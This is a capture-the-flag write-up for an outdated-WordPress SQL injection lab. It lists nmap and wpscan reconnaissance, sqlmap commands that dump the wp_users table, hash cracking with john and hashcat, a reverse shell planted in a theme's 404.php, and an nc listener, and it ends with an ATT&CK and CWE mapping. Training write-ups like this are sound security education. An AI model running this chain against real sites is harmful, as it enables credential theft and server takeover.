# maq117: CMS Wordpress Desatualizado

Writeup for the **CMS Wordpress Desatualizado** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** SQL Injection  
> **Difficulty:** Easy  
> **Points:** 117

---

## Overview

An outdated WordPress installation contains SQL injection vulnerabilities in its core or plugins, allowing database extraction, credential theft, and ultimately remote code execution through the admin panel.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Enumerate WordPress:

```bash
wpscan --url http://<TARGET_IP> --enumerate vp,vt,u
```

Identify the WordPress version, vulnerable plugins, and enumerated users. Focus on components with known SQL injection flaws.

## Exploitation

### Step 1: Identify SQLi Vector

Determine the vulnerable parameter in a plugin or core component. Test with standard injection payloads.

### Step 2: Extract Database Contents

Use sqlmap targeting the vulnerable endpoint:

```bash
sqlmap -u "http://<TARGET_IP>/?vulnerable_param=1" --dbs
sqlmap -u "http://<TARGET_IP>/?vulnerable_param=1" -D wordpress -T wp_users --dump
```

### Step 3: Crack Password Hashes

Extract WordPress password hashes and crack them:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Step 4: Access Admin Panel

Log in to `/wp-admin` with cracked credentials. Edit a theme file (e.g., 404.php) to inject a reverse shell.

### Step 5: Obtain Shell and Flag

Trigger the modified template and catch the shell:

```bash
nc -lvnp 4444
```

Read the flag from the filesystem.

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Valid Accounts                    | T1078     |
| Web Shell                         | T1505.003 |

### CWE

- **CWE-89:** SQL Injection
- **CWE-521:** Weak Password Requirements
- **CWE-916:** Use of Password Hash With Insufficient Computational Effort

---

An outdated CMS is a time capsule of vulnerabilities; every skipped update is an invitation written in SQL.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
